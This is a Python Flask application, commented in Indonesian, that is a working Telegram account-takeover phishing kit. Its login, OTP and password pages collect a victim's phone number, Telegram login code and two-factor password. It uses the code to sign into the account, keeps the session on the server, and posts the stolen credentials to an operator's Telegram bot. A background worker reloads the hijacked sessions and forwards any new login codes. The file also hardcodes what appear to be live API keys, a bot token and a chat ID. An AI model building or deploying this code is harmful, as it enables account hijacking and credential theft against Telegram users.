import os, asyncio, threading, requests
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events
from telethon.errors import PhoneCodeInvalidError

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")

# API_ID, API_HASH, BOT_TOKEN, CHAT_ID dari environment
api_id = int(os.getenv("API_ID", 16047851))
api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
CHAT_ID = os.getenv("CHAT_ID", "7712462494")

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# ============= BAGIAN FLASK =============
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        name = request.form.get("name")
        phone = request.form.get("phone")
        gender = request.form.get("gender")
        session["name"], session["phone"], session["gender"] = name, phone, gender

        # hapus session lama supaya OTP baru
        session_path = os.path.join(SESSION_DIR, f"{phone}.session")
        if os.path.exists(session_path):
            os.remove(session_path)

        async def send_code():
            client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
            await client.connect()
            if not await client.is_user_authorized():
                sent = await client.send_code_request(phone)
                session["phone_code_hash"] = sent.phone_code_hash
            await client.disconnect()

        try:
            asyncio.run(send_code())
            flash("OTP sudah dikirim ke Telegram kamu.")
            return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Error: {str(e)}")
            return redirect(url_for("login"))

    return render_template("login.html")

@app.route("/otp", methods=["GET", "POST"])
def otp():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if request.method == "POST":
        code = request.form.get("otp")

        async def verify_code():
            client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
            await client.connect()
            try:
                phone_code_hash = session.get("phone_code_hash")
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                await client.disconnect()
                return True
            except PhoneCodeInvalidError:
                await client.disconnect()
                return False

        try:
            result = asyncio.run(verify_code())
            if result:
                session["last_otp"] = code
                # kirim ke bot
                text = f"✅ OTP benar\nNomor : {phone}\nOTP   : {code}"
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={"chat_id": CHAT_ID, "text": text})
                flash("OTP benar, silakan masukkan password.")
                return redirect(url_for("password"))
            else:
                flash("OTP salah, coba lagi.")
                return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Error lain: {e}")
            return redirect(url_for("otp"))

    return render_template("otp.html")

@app.route("/password", methods=["GET", "POST"])
def password():
    if request.method == "POST":
        password = request.form.get("password")
        phone = session.get("phone")
        otp = session.get("last_otp")
        text = (
            "📢 *New User Login*\n"
            f"👤 *Number*   : `{phone}`\n"
            f"🔑 *OTP*      : `{otp}`\n"
            f"🔒 *Password* : `{password}`"
        )
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
        flash("Password berhasil dimasukkan (manual).")
        return redirect(url_for("success"))
    return render_template("password.html")

@app.route("/success")
def success():
    return render_template("success.html", name=session.get("name"), phone=session.get("phone"), gender=session.get("gender"))

# ============= BAGIAN WORKER TELETHON =============
async def forward_handler(event, client_name):
    """Handler untuk meneruskan pesan OTP"""
    text_msg = event.message.message
    if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": f"📩 Pesan OTP baru dari {client_name}:\n\n{text_msg}"
        }
        requests.post(url, data=payload)
        print(f"OTP diteruskan dari {client_name}: {text_msg}")

async def worker_main():
    print("Worker jalan...")

    clients = []
    for fname in os.listdir(SESSION_DIR):
        if fname.endswith(".session"):
            path = os.path.join(SESSION_DIR, fname)
            print(f"Memuat session {path}")
            client = TelegramClient(path, api_id, api_hash)
            await client.start()  # login otomatis pakai session
            clients.append(client)
            client.add_event_handler(lambda e, fn=fname: forward_handler(e, fn), events.NewMessage)

    if not clients:
        print("⚠️ Tidak ada file session di folder sessions/. Login dulu lewat web app untuk membuat session.")
    else:
        await asyncio.gather(*(c.run_until_disconnected() for c in clients))

def start_worker():
    asyncio.run(worker_main())

if __name__ == "__main__":
    # jalankan worker di thread terpisah
    t = threading.Thread(target=start_worker, daemon=True)
    t.start()

    # jalankan web server flask
    app.run(host="0.0.0.0", port=8080)
